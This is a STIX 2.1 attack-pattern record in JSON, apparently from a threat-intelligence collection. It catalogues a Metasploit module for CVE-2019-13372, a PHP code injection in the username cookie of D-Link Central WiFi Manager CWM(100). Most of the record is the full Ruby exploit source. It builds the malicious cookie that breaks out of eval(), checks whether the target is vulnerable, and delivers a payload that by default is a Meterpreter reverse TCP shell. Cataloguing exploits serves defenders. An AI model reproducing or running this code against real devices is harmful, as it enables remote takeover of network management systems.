{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b876702c-86dd-40b5-8d07-ce28645ceba7",
    "created": "2024-08-14T16:54:27.031357Z",
    "modified": "2024-08-14T16:54:27.031361Z",
    "name": "D-Link Central WiFi Manager CWM(100) RCE",
    "description": " This module exploits a PHP code injection vulnerability in D-Link Central WiFi Manager CWM(100) versions below `v1.03R0100_BETA6`. The vulnerability exists in the username cookie, which is passed to `eval()` without being sanitized. Dangerous functions are not disabled by default, which makes it possible to get code execution on the target.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/dlink_central_wifimanager_rce.rb",
            "external_id": "dlink_central_wifimanager_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-13372"
        },
        {
            "source_name": "reference",
            "url": "https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'D-Link Central WiFi Manager CWM(100) RCE',\n        'Description' => %q{\n          This module exploits a PHP code injection vulnerability in D-Link Central WiFi Manager CWM(100)\n          versions below `v1.03R0100_BETA6`. The vulnerability exists in the\n          username cookie, which is passed to `eval()` without being sanitized.\n          Dangerous functions are not disabled by default, which makes it possible\n          to get code execution on the target.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'M3@ZionLab from DBAppSecurity', # Original discovery\n          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # PoC, metasploit module\n        ],\n        'References' => [\n          ['CVE', '2019-13372'],\n          ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/' ]\n        ],\n        'Targets' => [ [ 'Automatic', {}] ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n          'SSL' => true,\n          'RPORT' => 443\n        },\n        'Platform' => %w[php],\n        'Arch' => [ ARCH_PHP ],\n        'DisclosureDate' => '2019-07-09'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to to the web application', '/'])\n      ]\n    )\n  end\n\n  def inject_php(cmd)\n    encode_char = ->(char) { \"%#{char.ord.to_s(16).rjust(2, '0')}\" }\n    payload = \"',0,\\\"\\\",1,\\\"0\\\")%3b#{cmd.gsub(/[;\\s]/, &encode_char)}%3b//\\\"\"\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri, 'index.php', 'Index', 'index'),\n      'cookie' => \"username=#{payload};password=\"\n    )\n    res ? res.body[/^(.*?)<!DOCTYPE html>/mi, 1] : nil\n  end\n\n  def check\n    rand_text = Rex::Text.rand_text_alphanumeric(rand(4..10))\n    if inject_php(\"echo \\\"#{rand_text}\\\"\")&.chomp == rand_text\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    inject_php(payload.raw)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-09",
    "x_mitre_platforms": [
        "%w[php]"
    ]
}